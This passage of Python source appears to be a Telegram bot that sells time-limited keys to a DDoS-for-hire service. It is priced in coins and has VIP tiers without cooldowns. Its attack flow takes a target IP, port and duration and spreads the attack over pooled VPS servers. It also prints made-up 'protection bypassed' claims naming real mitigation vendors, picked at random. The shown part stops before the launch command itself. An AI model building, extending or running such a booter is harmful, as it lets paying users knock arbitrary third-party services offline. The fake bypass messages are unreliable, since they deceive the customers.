🟢 𝗢𝗻𝗹𝗶𝗻𝗲: {online_vps}
🟡 𝗕𝘂𝘀𝘆: {busy_vps}
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲: {offline_vps}
𝗧𝗼𝘁𝗮𝗹: {len(VPS_LIST)}
"""
    
    full_message = summary + "\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id, parse_mode="Markdown")
    except:
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                safe_send_message(message.chat.id, part, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, full_message, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "🍁 𝙑𝙄𝙋 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉")
def vip_features(message):
    """Show VIP features information with premium styling"""
    response = f"""
╭━━━〔 *🌌 𝗨𝗟𝗧𝗥𝗔 𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗* 〕━━━╮
        *"Only the Elite Shall Pass..."*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🧠 *𝗜𝗡𝗧𝗘𝗟𝗟𝗜𝗚𝗘𝗡𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗘𝗡𝗚𝗜𝗡𝗘*  
━━━━━━━━━━━━━━━━━━━━━━━  
• ⚙️ 𝗠𝗮𝘅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{VIP_MAX_DURATION} sec`  
• 🧵 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: `{VIP_MAX_THREADS}`  
• ⏳ 𝗭𝗘𝗥𝗢 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: Fire instantly, again & again  
• 🚀 𝗣𝗿𝗶𝗼𝗿𝗶𝘁𝘆 𝗤𝘂𝗲𝘂𝗲: Jump ahead of normal users  
• ♻️ 𝗥𝗲-𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗶𝘁𝗵𝗼𝘂𝘁 𝗪𝗮𝗶𝘁  
• 🔁 𝗠𝘂𝗹𝘁𝗶-𝗩𝗣𝗦 𝗟𝗼𝗮𝗱 𝗦𝗽𝗿𝗲𝗮𝗱

🛡️ *𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦 𝗭𝗢𝗡𝗘*  
━━━━━━━━━━━━━━━━━━━━━━━  
• 📞 24/7 𝗩𝗜𝗣 𝗛𝗲𝗹𝗽𝗱𝗲𝘀𝗸 𝗦𝘂𝗽𝗽𝗼𝗿𝘁  
• 🧬 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗩𝗜𝗣-𝗢𝗡𝗟𝗬 𝗡𝗢𝗗𝗘𝗦  
• 🛰️ 𝗟𝗼𝘄 𝗟𝗮𝘁𝗲𝗻𝗰𝘆, 𝗛𝗶𝗴𝗵 𝗧𝗮𝗿𝗴𝗲𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁  
• 🔒 𝗡𝗼 𝗔𝗻𝗮𝗹𝘆𝘁𝗶𝗰𝘀 - True Anonymity  
• ☢️ 𝗕𝗿𝘂𝘁𝗮𝗹 𝗦𝘁𝗿𝗶𝗸𝗲 𝗣𝗮𝗰𝗸𝘀 (Coming Soon)

🎖 *𝗢𝗧𝗛𝗘𝗥 𝗕𝗢𝗡𝗨𝗦𝗘𝗦*  
━━━━━━━━━━━━━━━━━━━━━━━  
• 🎁 Free monthly special keys  
• 💠 Early access to new methods  
• 🔄 Lifetime refill offers (on select plans)

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔑 *𝗧𝗢 𝗝𝗢𝗜𝗡 𝗧𝗛𝗘 𝗟𝗘𝗚𝗘𝗡𝗗𝗦:*  
Contact the High Table: [@{OWNER_USERNAME}]

⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: Misuse will result in instant banishment.

━━━━━━━〔 *𝗘𝗡𝗗 𝗢𝗙 𝗙𝗜𝗟𝗘* 〕━━━━━━━
"""
    safe_reply_to(message, response, parse_mode="Markdown")

# ======================
# 🔑 KEY MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🔓 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔")
def generate_key_start(message):
    """Handle key generation initiation with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, 
            "⛔ *ACCESS DENIED!*\n\n"
            "Only authorized *Overlords* can forge new access tokens.",
            parse_mode="Markdown")
        return

    # Create selection keyboard
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("10M (5 coins)"),
        telebot.types.KeyboardButton("30M (8 coins)"),
        telebot.types.KeyboardButton("2H (12 coins)"),
        telebot.types.KeyboardButton("5H (15 coins)"),
        telebot.types.KeyboardButton("1D (20 coins)"),
        telebot.types.KeyboardButton("2D (30 coins)"),
        telebot.types.KeyboardButton("1W (100 coins)"),
        telebot.types.KeyboardButton("VIP1D (50 coins)"),
        telebot.types.KeyboardButton("VIP2D (80 coins)"),
        telebot.types.KeyboardButton("❌ Cancel")
    ]
    markup.add(*buttons)

    # Styled panel message
    safe_reply_to(message, 
        f"""
╭━━━〔 *🧿 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗜𝗢𝗡 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
       *"Only the Architect may shape access."*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🔐 *𝗖𝗛𝗢𝗢𝗦𝗘 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:*  
━━━━━━━━━━━━━━━━━━━━━━━  
🔹 `10M`  → 💰 *5 Coins*  
🔹 `30M`  → 💰 *8 Coins*  
🔹 `2H`   → 💰 *12 Coins*  
🔹 `5H`   → 💰 *15 Coins*  
🔹 `1D`   → 💰 *20 Coins*  
🔹 `2D`   → 💰 *30 Coins*  
🔹 `1W`   → 💰 *100 Coins*

🌟 *𝗩𝗜𝗣 𝗞𝗘𝗬𝗦:*  
━━━━━━━━━━━━━━━━━━━━━━━  
💎 `VIP1D` → 💰 *50 Coins*  
💎 `VIP2D` → 💰 *80 Coins*

🧠 *All keys are encrypted and time-limited*  
🛰️ *VIP keys grant elite-level network execution rights*

━━━━━━━━━━━━━━━━━━━━━━━  
🔔 *Select your key type from the menu below*  
❌ *Cancel anytime with:* ❌ Cancel
""",
        parse_mode="Markdown",
        reply_markup=markup
    )
    bot.register_next_step_handler(message, process_key_duration)

def process_key_duration(message):
    """Process key duration selection with premium styling"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        safe_reply_to(message, "🚫 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗.", reply_markup=create_main_keyboard(message))
        return

    try:
        duration_str = message.text.split()[0]  # Extract "1H", "VIP1D" etc.
        if duration_str not in KEY_PRICES:
            raise ValueError("Invalid duration")

        # Generate unique key
        key_prefix = "VIP-" if duration_str.startswith("VIP") else ""
        unique_code = os.urandom(3).hex().upper()
        key = f"{key_prefix}{OWNER_USERNAME}-{duration_str}-{unique_code}"

        # Store key based on type
        expiry_seconds = (
            int(duration_str[3:-1]) * 86400 if duration_str.startswith("VIP") 
            else int(duration_str[:-1]) * 3600 if duration_str.endswith("H") 
            else int(duration_str[:-1]) * 86400
        )

        if duration_str.startswith("VIP"):
            vip_keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }
        else:
            keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }

        save_data()

        # Send key to admin
        safe_send_message(
            message.chat.id,
            f"🔐 𝗡𝗘𝗪 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!\n\n"
            f"• 𝗧𝘆𝗽𝗲: `{duration_str}`\n"
            f"• 𝗞𝗲𝘆: `{key}`\n"
            f"• 𝗩𝗮𝗹𝗶𝗱 𝗳𝗼𝗿: {duration_str}\n"
            f"• 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: @{message.from_user.username}",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message)
        )

        # Log to owner
        if str(message.from_user.id) not in ADMIN_IDS:
            safe_send_message(
                ADMIN_IDS[0],
                f"📝 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗟𝗢𝗚\n\n"
                f"• 𝗕𝘆: @{message.from_user.username}\n"
                f"• 𝗞𝗲𝘆: `{key}`\n"
                f"• 𝗧𝘆𝗽𝗲: {duration_str}"
            )

    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗥𝗥𝗢𝗥: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔")
def redeem_key_start(message):
    """Start key redemption process with premium styling"""
    if not is_allowed_group(message):
        safe_reply_to(message, "❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽!")
        return
    
    safe_reply_to(message, "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗸𝗲𝘆 𝘁𝗼 𝗿𝗲𝗱𝗲𝗲𝗺.", parse_mode="Markdown")
    bot.register_next_step_handler(message, redeem_key_input)
    
def redeem_key_input(message):
    """Process key redemption with premium styling"""
    key = message.text.strip()
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Check normal keys
    if key in keys:
        expiry_time = keys[key]['expiration_time']
        if time.time() > expiry_time:
            safe_reply_to(message, "❌ 𝗞𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': False
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key
        }
        
        del keys[key]
        
    # Check VIP keys
    elif key in vip_keys:
        expiry_time = vip_keys[key]['expiration_time']
        if time.time() > expiry_time:
            safe_reply_to(message, "❌ 𝗩𝗜𝗣 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': vip_keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': True
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key,
            'is_vip': True
        }
        
        del vip_keys[key]
        
    else:
        safe_reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
    
    save_data()
    
    remaining_time = expiry_time - time.time()
    hours = int(remaining_time // 3600)
    minutes = int((remaining_time % 3600) // 60)
    
    if redeemed_users[user_id].get('is_vip'):
        response = f"""
🌟 𝗩𝗜𝗣 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺

🔥 𝗩𝗜𝗣 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦:
• Max Duration: {VIP_MAX_DURATION}𝘀
• Max Threads: {VIP_MAX_THREADS}
• Priority Queue Access
• No Cooldowns
"""
    else:
        response = f"""
✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺
"""
    
    safe_reply_to(message, response, parse_mode="Markdown")
    
    # Notify owner
    if not is_admin(user):
        try:
            safe_send_message(
                ADMIN_IDS[0], 
                f"🔑 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n\n"
                f"• 𝗨𝘀𝗲𝗿: @{user.username if user.username else user.first_name}\n"
                f"• 𝗞𝗲𝘆: `{key}`\n"
                f"• 𝗧𝘆𝗽𝗲: {'VIP' if redeemed_users[user_id].get('is_vip') else 'Normal'}"
            )
        except:
            pass

@bot.message_handler(func=lambda msg: msg.text == "📋 𝙆𝙀𝙔 𝙇𝙄𝙎𝙏")
def show_key_list(message):
    """Show list of all active and redeemed keys with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝗸𝗲𝘆 𝗹𝗶𝘀𝘁!")
        return

    # Helper functions
    def get_username(user_id):
        try:
            user = bot.get_chat(user_id)
            return f"@{user.username}" if user.username else user.first_name
        except:
            return str(user_id)

    def format_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}𝘀"
        elif seconds < 3600:
            return f"{int(seconds//60)}𝗺"
        elif seconds < 86400:
            return f"{int(seconds//3600)}𝗵"
        else:
            return f"{int(seconds//86400)}𝗱"

    current_time = time.time()

    # Prepare sections
    sections = []
    
    # 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗢𝗥𝗠𝗔𝗟 𝗞𝗘𝗬𝗦
    active_normal = []
    for key, details in keys.items():
        if details['expiration_time'] > current_time:
            active_normal.append(
                f"🔹 <code>{key}</code>\n"
                f"├ 𝗧𝘆𝗽𝗲: 𝗡𝗢𝗥𝗺𝗮𝗹\n"
                f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
                f"└ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_normal:
        sections.append("🍅 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗢𝗥𝗠𝗔𝗟 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_normal))

    # 𝗔𝗖𝗧𝗜𝗩𝗘 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦
    active_vip = []
    for key, details in vip_keys.items():
        if details['expiration_time'] > current_time:
            active_vip.append(
                f"💎 <code>{key}</code>\n"
                f"├ 𝗧𝘆𝗽𝗲: 𝗩𝗜𝗣\n"
                f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
                f"└ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_vip:
        sections.append("\n🌟 𝗔𝗖𝗧𝗜𝗩𝗘 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_vip))

    # 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦
    redeemed = []
    for key, details in redeemed_keys_info.items():
        status = "✅ 𝗔𝗰𝘁𝗶𝘃𝗲" if details['expiration_time'] > current_time else "❌ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
        redeemed.append(
            f"🔓 <code>{key}</code>\n"
            f"├ 𝗧𝘆𝗽𝗲: {'𝗩𝗜𝗣' if details.get('is_vip') else '𝗡𝗼𝗿𝗺𝗮𝗹'}\n"
            f"├ 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
            f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
            f"└ 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗯𝘆: {get_username(details['redeemed_by'])}\n"
        )
    if redeemed:
        sections.append("\n🔑 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦:\n" + "\n".join(redeemed))

    if not sections:
        sections.append("ℹ️ 𝗡𝗼 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺")

    full_message = "\n".join(sections)

    # Send with original fonts and copy feature
    safe_send_message(
        message.chat.id,
        full_message,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔")
def delete_key_start(message):
    """Initiate key deletion process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗱𝗲𝗹𝗲𝘁𝗲 𝗸𝗲𝘆𝘀!")
        return

    safe_reply_to(message, 
        "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗸𝗲𝘆 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗱𝗲𝗹𝗲𝘁𝗲:\n\n"
        "𝗙𝗼𝗿𝗺𝗮𝘁: <𝗸𝗲𝘆>\n"
        "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: RAJARAJ909-1H-ABC123",
        parse_mode="Markdown")
    bot.register_next_step_handler(message, process_key_deletion)

def process_key_deletion(message):
    """Process key deletion with premium styling"""
    key = message.text.strip()
    deleted = False

    # Check in active normal keys
    if key in keys:
        del keys[key]
        deleted = True
    # Check in active VIP keys
    elif key in vip_keys:
        del vip_keys[key]
        deleted = True
    # Check in redeemed keys info
    elif key in redeemed_keys_info:
        # Also remove from redeemed_users if exists
        user_id = redeemed_keys_info[key]['redeemed_by']
        if user_id in redeemed_users:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        deleted = True

    if deleted:
        save_data()
        safe_reply_to(message, 
            f"✅ 𝗞𝗲𝘆 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n"
            f"𝗞𝗲𝘆: `{key}`",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))
    else:
        safe_reply_to(message, 
            "❌ 𝗞𝗲𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻:\n"
            "- Active keys\n"
            "- VIP keys\n"
            "- Redeemed keys",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))

# ======================
# 🚀 ATTACK SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text in ["🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃", "🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"])
def attack_start(message):
    """Start attack process with premium styling and strict limits"""
    # Check if this is a public group attack
    is_public = message.chat.id in PUBLIC_GROUPS and not is_authorized_user(message.from_user)
    
    if is_public:
        safe_reply_to(message, 
            "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:\n\n"
            "<𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>\n\n"
            "• 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀\n"
            "• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 1800 (𝗳𝗶𝘅𝗲𝗱)")
        bot.register_next_step_handler(message, process_public_attack_args)
        return
    
    # Original authorization check for private/VIP attacks
    if not is_authorized_user(message.from_user):
        safe_reply_to(message, "❌ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸!")
        return
    
    global last_attack_time
    current_time = time.time()
    user_id = str(message.from_user.id)
    
    # Check cooldown (skip for VIP)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    if not is_vip and current_time - last_attack_time < global_cooldown:
        remaining = int(global_cooldown - (current_time - last_attack_time))
        safe_reply_to(message, f"⌛ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗮𝗰𝘁𝗶𝘃𝗲. 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}𝘀")
        return
    
    # Determine max duration based on user type
    max_duration = VIP_MAX_DURATION if is_vip else MAX_DURATION
    
    safe_reply_to(message, 
        f"⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:\n\n"
        f"<𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>\n\n"
        f"{'🌟 𝗩𝗜𝗣 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦' if is_vip else '🔹 𝗡𝗢𝗥𝗠𝗔𝗟 𝗔𝗖𝗖𝗘𝗦𝗦'}\n"
        f"• 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {max_duration}𝘀\n"
        f"• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 1800 (𝗳𝗶𝘅𝗲𝗱)")
    bot.register_next_step_handler(message, process_attack_args)

def process_public_attack_args(message):
    """Process attack arguments for public mode with strict limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        threads = 200  # Fixed thread count
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            # Enforce public attack limits strictly
            if duration > 120:
                raise ValueError("❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝟭𝟮𝟬𝘀 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀")
                
            # Start attack with public limitations
            start_attack(message, ip, port, duration, threads, is_public=True)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def process_attack_args(message):
    """Process attack arguments with strict enforcement of VIP/normal limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        threads = 200  # Fixed thread count
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            user_id = str(message.from_user.id)
            is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
            
            # Enforce VIP/normal limits strictly
            max_duration = VIP_MAX_DURATION if is_vip else MAX_DURATION
            
            if duration > max_duration:
                raise ValueError(f"❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 {max_duration}𝘀 {'(𝗩𝗜𝗣)' if is_vip else ''}")
                
            # Start attack
            start_attack(message, ip, port, duration, threads)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def start_attack(message, ip, port, duration, threads, is_public=False):
    """Execute the attack with all premium visual elements and hidden VPS IP"""
    user = message.from_user
    user_id = str(user.id)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    
    # Select ALL available VPS for the attack
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values()]
    # Modified: Always select up to ACTIVE_VPS_COUNT, irrespective of is_public
    available_vps = [vps for vps in VPS_LIST[:ACTIVE_VPS_COUNT] if vps[0] not in busy_vps] 
    
    if not available_vps:
        safe_reply_to(message, "❌ 𝗡𝗼 𝘀𝗲𝗿𝘃𝗲𝗿𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲! 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.")
        return
    
    attack_id = f"{ip}:{port}-{time.time()}"
    
    # Generate random country and protection for visual effect (unchanged)
    countries = [
        ("United States", "🇺🇸"), ("Germany", "🇩🇪"), ("Japan", "🇯🇵"),
        ("Singapore", "🇸🇬"), ("Netherlands", "🇳🇱"), ("France", "🇫🇷"),
        ("United Kingdom", "🇬🇧"), ("Canada", "🇨🇦"), ("Russia", "🇷🇺"),
        ("Brazil", "🇧🇷"), ("India", "🇮🇳"), ("Australia", "🇦🇺"),
        ("South Korea", "🇰🇷"), ("Sweden", "🇸🇸"), ("Switzerland", "🇨🇭"),
        ("Italy", "🇮🇹"), ("Spain", "🇪🇸"), ("Norway", "🇳🇴"),
        ("Mexico", "🇲🇽"), ("South Africa", "🇿🇦"), ("Poland", "🇵🇱"),
        ("Turkey", "🇹🇷"), ("Argentina", "🇦🇷"), ("Thailand", "🇹🇭"),
        ("Ukraine", "🇺🇦"), ("Malaysia", "🇲🇾"), ("Indonesia", "🇮🇩"),
        ("Philippines", "🇵🇭"), ("Vietnam", "🇻🇳"), ("Saudi Arabia", "🇸🇦")
    ]
    country, flag = random.choice(countries)
    
    protections = [
        "🛡️ Cloudflare Enterprise Shield",
        "☁️ AWS Shield Platinum",
        "🧠 Google Titan Armor",
        "🦅 Imperva Incapsula Elite",
        "🌐 Akamai Prolexic Sentinel",
        "💎 Azure Diamond Defense",
        "⚔️ FortiDDoS Fortress",
        "🔮 Radware Magic Shield",
        "🏰 F5 Silverline Castle",
        "🕷️ Sucuri Web Knight",
        "🛡️ StackPath Iron Dome",
        "🌪️ Fastly Storm Wall",
        "🛡️ Barracuda WAF-X",
        "🏹 Citrix Arrow Defense",
        "🛡️ Arbor Cloud Sentinel",
        "🧿 Nexusguard Orb",
        "🛡️ NSFOCUS Dragon Wall",
        "⚡ Corero Lightning Shield",
        "🛡️ A10 Thunder Barrier",
        "🌌 Alibaba Cloud Great Wall"
    ]
    protection = random.choice(protections)
    
    # Create initial attack message with flag (unchanged)
    attack_type = "🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞" if is_public else "🔥 𝗩𝗜𝗣 𝗔𝗧𝗧𝗔𝗖𝗞" if is_vip else "🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛"
    
    msg_text = f"""
╭━━━〔 {attack_type} 〕━━━╮
┃
┣  𝗣𝗿𝗼𝘅𝘆 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻: {flag} {country}
┣ 🛡️ 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀𝗲𝗱: ✅ {protection}
┃
┣ 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}
┣ ⏱ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}𝘀
┣ 🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}
┃
┣ 🔄 𝗜𝗻𝗶𝘁𝗶𝗮𝗹𝗶𝘇𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸...
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    msg = safe_send_message(message.chat.id, msg_text)
    
